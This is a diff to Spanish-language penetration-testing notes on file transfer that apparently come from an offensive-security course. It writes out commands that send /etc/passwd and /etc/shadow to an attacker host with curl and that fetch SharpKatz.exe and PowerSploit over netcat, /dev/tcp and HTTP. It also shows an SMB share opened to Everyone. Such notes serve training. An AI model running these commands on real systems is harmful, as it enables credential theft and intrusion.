@@ -1,3 +1,4 @@
+#fileTransfer
 ## **Windows**
 ### Descargar Archivos 
 #### Decodificar en base64
@@ -45,9 +46,9 @@ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/
 copy \\192.168.220.133\share\nc.exe C:\Users\Public\nc.exe /user:<usuario> <contraseña>
 ```
 Si el servidor está montado sin user/pass podremos acceder sin añadir `/user:<usuario> <contraseña>`
-#### Montando SMB
+#### Montando SMB (mapeando en realidad)
 ```powershell
-net use Z: \\192.168.220.133\share /user:test test
+net use n: \\192.168.220.133\share /user:test test
 ```
 
 #### **FTP** - Descarga de archivo  
@@ -197,7 +198,7 @@ scp [opciones] origen destino
 ### Subir archivos 
 #### cURL + POST - HTTP
 ```bash
-`curl -X POST http://192.168.49.128:8000/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow'`
+curl -X POST http://192.168.49.128:8000/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow'
 ```
 #### cURL + POST - HTTPs
 ```bash
@@ -251,6 +252,10 @@ Crea el recurso `share`
 ##### Impacket-smbserver - Con credenciales
 ```bash
  sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
+```
+##### Con powershell
+```bash
+New-SmbShare -Name "share" -Path "C:\Users\Public\share" -FullAccess Everyone
 ```
 #### WebDAV - `wsgidav`
 Si Windows no encuentra el protocolo SMB disponible, intenta utilizar WebDAV  como alternativa en los puertos 80 ó 443. Útil para bypassear bloqueos en el puerto 445
@@ -419,14 +424,18 @@ nc 192.168.49.128 443 > SharpKatz.exe
 # Example using Ncat
 ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
 ```
-#### Máquina comprometida - sin netcat
-Escribiendo en pseudo-dispositivo `/dev/TCP` hace que bash abra una conexión al host y puerto especificados, pudiendo envíar archivos. 
+## Con `/dev/tcp`
+### Envíar archivo
 ```bash
-cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
+cat prueba.txt > /dev/tcp/0.0.0.0/4444
 ```
+### Recibir archivo
+```bash
+cat < /dev/tcp/<ip_servidor>/4444 > archivo_recibido
+```
+
 ---
 ## Living off the land
 Este concepto es acuñado a los archivos que puede utilizar un atacante para realizar acciones que van más allá de su propósito general.
 Actualmente hay dos sitios web que recopilan información sobre los archivos binarios Living off the Land:
 - [LOLBAS Project for Windows Binaries](https://lolbas-project.github.io/)
-- [GTFOBins for Linux Binaries](https://gtfobins.github.io/)
